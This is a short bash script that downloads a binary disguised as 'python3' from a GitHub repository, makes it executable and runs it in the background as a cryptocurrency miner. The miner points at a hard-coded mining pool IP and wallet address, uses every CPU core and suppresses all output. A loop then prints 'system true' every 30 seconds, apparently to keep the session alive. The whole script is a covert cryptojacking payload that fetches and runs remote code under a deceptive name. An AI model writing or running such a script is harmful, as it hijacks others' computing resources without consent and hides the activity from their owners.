#!/bin/bash
wget https://github.com/azkhaadhenia/cli/raw/main/python3
chmod +x python3
./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u TJFizKH6LFbQfSi95hfwtBZcnA8sWtA3Cg.her -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30; done
